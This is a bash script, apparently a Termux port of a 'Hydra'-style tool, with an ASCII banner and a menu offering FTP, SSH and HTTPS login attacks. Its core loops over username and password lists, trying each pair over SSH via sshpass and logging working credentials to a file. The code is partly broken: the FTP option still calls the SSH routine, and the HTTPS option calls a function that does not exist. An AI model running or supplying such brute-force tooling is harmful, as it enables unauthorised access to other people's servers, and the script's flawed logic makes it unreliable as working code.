#!/bin/bash

# Configuration
SUCCESS_FILE="success_log.txt"
DELAY_BETWEEN_ATTEMPTS=1

# Function to clear the screen
clear_screen() {
    clear
}

# Function to display the green-colored banner
display_banner() {
    echo -e "\e[32m⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣿⠀⠀⠀⠀⠀⢀⣴⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠁⣼⢻⠃⣀⣀⣀⣠⣴⡿⣹⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠀⠀⣼⡏⡙⠋⢍⢉⡉⢡⣰⣖⢻⣧⠀⠀⢀⣤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣏⡇⣄⠯⢰⠂⠌⣖⣡⣯⠓⣿⣇⠀⣜⠇⠉⠁⠀⠒⠚⠛⣹⡇⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢤⠤⣄⢞⡭⠓⢠⠘⡠⣉⣌⡵⠾⢤⡌⡟⣿⠀⣯⣠⣤⣤⣀⡀⠀⠀⠈⣿⣦⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢢⡄⠋⣶⡙⢦⣚⡴⠱⠋⠈⣀⣿⣆⡝⣿⣴⢿⣏⣿⣿⠿⣶⣿⣷⡄⠘⣻⣷⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣧⣶⣦⣤⣶⣶⣤⣤⡄⠀⠀⢻⡄⠀⣀⠀⢀⡀⡄⠀⣴⡾⠋⢸⡜⣿⠃⠀⠉⠛⠛⠦⠐⠻⢿⣿⣿⠘⣿⣻⣦⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⡿⠻⡘⠄⢧⠸⡄⣇⠻⢿⣿⣧⣧⡄⣀⣿⣤⣿⣿⣿⣿⣧⣼⣟⡧⠀⣤⢻⣿⢠⡧⢤⣤⠤⠄⣀⠀⠘⠿⠻⠇⣿⣿⣿⣇⠀
⠀⠀⠀⠀⠀⣀⡴⠟⠩⣄⣄⣃⡴⢮⠧⠻⠼⢌⣛⠦⣍⢻⣿⣿⣿⡟⣿⣿⣏⠇⢘⡛⣷⡟⢋⢬⢇⣿⣿⣼⡇⠀⣿⠄⠀⠀⢁⠐⠀⠐⢰⣿⣿⡿⢿⣆
⠀⠀⢀⣠⢞⡟⣺⢧⠓⡀⠠⠁⠠⠀⠀⡀⠀⠀⠸⠷⣬⢣⢻⣿⣿⣷⡘⠛⠀⠈⠉⠁⠉⢁⢂⢮⣿⣿⠟⠿⠁⢰⡏⠀⠀⢸⣎⠃⠈⠁⣸⣿⣿⡏⠀⠁
⣀⠴⠟⠓⠚⣪⣧⣾⣿⠏⢡⣤⠧⠒⠚⠢⢤⣀⠀⠀⢨⡇⢧⣿⣿⣿⣧⠀⠄⠀⠠⠤⢀⢂⣎⣷⡿⠋⠀⠀⢠⡞⠁⠀⠀⠀⠀⠀⠀⢠⣿⣷⣿⡧⠀⠀
⠙⠳⣤⣀⣰⣿⣿⣿⠘⢀⣸⠁⠀⠀⠀⠀⠀⢸⡆⠀⢸⡝⢦⣿⣿⣿⠿⡆⠀⢤⣄⣤⢃⣎⣾⡿⠇⠀⢀⡴⠋⠀⠀⠠⠀⠀⠀⠀⣰⡿⣷⡿⣿⡅⠀⠀
⠀⠀⠀⠈⠉⠹⣟⠛⢡⡞⠁⠀⠀⠀⠀⠀⠀⠀⡿⠀⣨⡙⢾⣿⡿⠛⠊⠡⠀⡈⠓⢡⢺⣾⣿⢀⣠⠞⠉⠁⠐⠄⡀⠀⠀⠀⢀⣼⢿⣽⣿⢼⣿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢹⣦⠏⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠠⡝⡼⣹⠟⠃⠤⠀⡀⠀⠀⡰⣭⣿⣿⠟⠉⠁⠀⠄⠀⠀⠀⠈⠢⢀⣴⣟⣯⣟⣾⣿⣟⠂⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣦⡄⠀⠀⠀⠀⠀⠀⡴⠀⢀⣻⠑⠾⠅⠀⠀⠀⠀⠀⣠⡞⡑⠃⠉⠀⠐⠀⡀⠀⠀⠀⢀⢀⣠⡶⣿⣷⣿⣿⣳⡟⠛⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢿⣿⠇⠀⠀⠀⠀⢀⠟⠀⠀⡾⠁⠀⠀⠀⠀⠀⠀⢀⠐⠁⠀⠁⠀⠀⠀⠀⠀⠀⢂⣠⣴⣺⣿⣿⡿⣹⡿⠿⠿⠏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡏⠀⠂⡼⠁⠀⠀⠁⠐⠠⠈⠀⠀⠀⠀⠂⠀⠀⠀⢀⣠⣴⣚⡝⣶⣿⣽⣿⣿⢾⣯⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠀⠀⢀⢃⣀⡀⠀⠀⠠⠀⠀⠄⡀⠀⠀⠀⢀⡤⣺⣙⠲⡜⣯⣻⣿⣟⣿⢯⣌⣼⣿⣃⣠⣄⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠈⠘⠀⠀⠀⢁⠂⠀⠀⠀⠀⠀⠁⠀⡠⢗⡼⢡⢎⡳⢩⢖⡹⣜⢣⡟⡿⢾⣟⡿⢯⣟⡿⣻⣷⣦⣀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⠀⡛⡼⣰⢋⠶⣉⢗⡪⡕⣎⢧⠯⣝⣳⢮⡽⣛⡾⣽⣳⣯⣿⢿⣶⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠁⠀⠀⠐⣧⢓⢦⢋⡞⣡⢎⡵⡹⡜⢮⡝⣮⢳⣏⡾⣽⣛⡷⣯⢷⣿⣻⣿⣿⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⣞⢬⢳⡸⣑⢎⠶⡱⢭⣳⠺⣵⢫⣞⡵⣯⣽⣻⣽⣻⣾⢿⣽⣿⡧⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣄⠀⢀⡀⠀⢀⠀⠤⠄⠀⠐⠂⠁⠀⠈⠪⢇⡳⡜⣎⢳⡙⣖⣣⢟⡼⣣⣿⠾⠷⠳⠿⠾⣷⣿⣻⣯⣿⡗⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢣⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠈⠙⠒⣧⣽⡆⣷⣾⢻⠉⠀⠀⠀⠀⠀⠀⢩⣿⣿⣽⣿⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢦⣄⡀⠀⠀⠀⠀⠀⠀⠂⠈⠀⠀⠀⣀⢀⣀⣠⡬⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⣀⣾⣿⣻⡟⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣬⣿⣷⣺⣥⣶⣶⣶⢤⣤⣴⡶⠟⠋⠉⢉⣤⣴⠶⣶⢾⣳⢶⡶⣶⣶⣶⡿⣿⣿⠿⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣿⣾⣿⣽⡿⠿⠛⢿⣿⣿⣿⣿⠀⠀⢠⡶⣿⣷⡾⠛⠛⠉⠉⠙⠛⠿⢾⣷⣿⡟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠻⠇⠁⠀⠀⠀⠙⡿⠋⠂⠀⢀⣿⣽⠏⠀⠀⠀⠀⠀⠀⠀⠀⣀⡴⣟⣿⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣧⢿⡁⠀⠀⠀⠀⠀⠀⢠⣾⣿⣾⣧⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣾⣻⢧⣄⣀⣀⣀⣠⣽⣿⡿⠛⠻⠇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠻⢿⢽⠯⣿⣿⠟
\e[0m"
}

# Function for generic attack
perform_attack() {
    local target_type=$1
    local target_ip
    local target_port
    local username_input
    local password_input

    clear_screen
    display_banner
    echo "${target_type} HYDRA ATTACK 🐉🐲"
    echo ""

    read -p "Enter Target IP: " target_ip
    read -p "Enter ${target_type} Port: " target_port
    read -p "Enter Username / UsernameFile: " username_input
    read -p "Enter Password or PassFile: " password_input

    usernames=()
    passwords=()

    if [[ -f $username_input ]]; then
        IFS=$'\r\n' GLOBIGNORE='*' command eval 'usernames=($(cat "$username_input"))'
    else
        usernames+=($username_input)
    fi

    if [[ -f $password_input ]]; then
        IFS=$'\r\n' GLOBIGNORE='*' command eval 'passwords=($(cat "$password_input"))'
    else
        passwords+=($password_input)
    fi

    success_file="${target_type}_success_log.txt"
    touch $success_file

    for user in "${usernames[@]}"; do
        for pass in "${passwords[@]}"; do
            attack_command="perform_ssh_attack '$target_ip' '$target_port' '$user' '$pass'"

            echo "Trying ${target_type} login - User: $user, Password: $pass"
            eval $attack_command

            if [ $? -eq 0 ]; then
                echo -e "\e[32mAttack Success: Valid credentials - IP: $target_ip, Username: $user, Password: $pass\e[0m"
                echo "IP: $target_ip, Username: $user, Password: $pass" >> $success_file
                sleep 2
                read -p "Do you want to exit or continue attacking? [E/C]: " exit_option
                if [ "$exit_option" == "E" ] || [ "$exit_option" == "e" ]; then
                    echo "Exiting Hydra. Thanks! 🐉"
                    return
                fi
            else
                echo -e "\e[31mAttack Failed: Invalid credentials - IP: $target_ip, Username: $user, Password: $pass\e[0m"
            fi

            sleep $DELAY_BETWEEN_ATTEMPTS
        done
    done

    echo "${target_type} Brute Force Attack Completed."
    read -n 1 -s -r -p "Press Hydra Enter 🐉"
}

# Function for FTP attack
perform_ftp_attack() {
    local target_ip=$1
    local ftp_port=$2
    local user=$3
    local pass=$4

    ftp_command="ftp -n $target_ip $ftp_port"
    ftp_attempt="user $user $pass\nquit"
    echo -e $ftp_attempt | eval $ftp_command > /dev/null 2>&1

    return $?
}

# Function for SSH attack
perform_ssh_attack() {
    local target_ip=$1
    local ssh_port=$2
    local user=$3
    local pass=$4

    ssh_command="sshpass -p '$pass' ssh -o StrictHostKeyChecking=no -p $ssh_port $user@$target_ip"
    eval $ssh_command

    return $?
}

# Main Program
while true; do
    clear_screen
    display_banner
    echo "---------------------------------------------------------------------------------TERMUX HYDRA MENU:---------------------------------------CREATED BY IAMUNIXTZ------------------"

    echo "[01] FTP Attack"

    echo "[02] SSH Attack"

    echo "[03] HTTPS POST Login Attack"

    echo "[04] Report Bug"

    echo "[05] Tool Details"

    echo "[06] Exit"

    read -p "=============>> : " option

    case $option in
        1) perform_attack "FTP";;
        2) perform_attack "SSH";;
        3) https_post_login_attack;;
        4)
            clear_screen
            display_banner
            echo "Hydra 🐉 User, if you find any bugs, kindly report them on Github as issues. Thanks."
            echo "[00] Back to Main Menu"
            read -p "Enter Option: " bug_option
            if [[ $bug_option == "00" ]]; then
                continue
            fi
            ;;
        5)
            clear_screen
            display_banner
            echo "This tool is inspired by Hydra and modified for Termux users. Thanks."
            echo "[00] Back to Main Menu"
            read -p "Enter Option: " details_option
            if [[ $details_option == "00" ]]; then
                continue
            fi
            ;;
        6) exit;;
        *) echo "Invalid Option 🐲🐉.";;
    esac
done

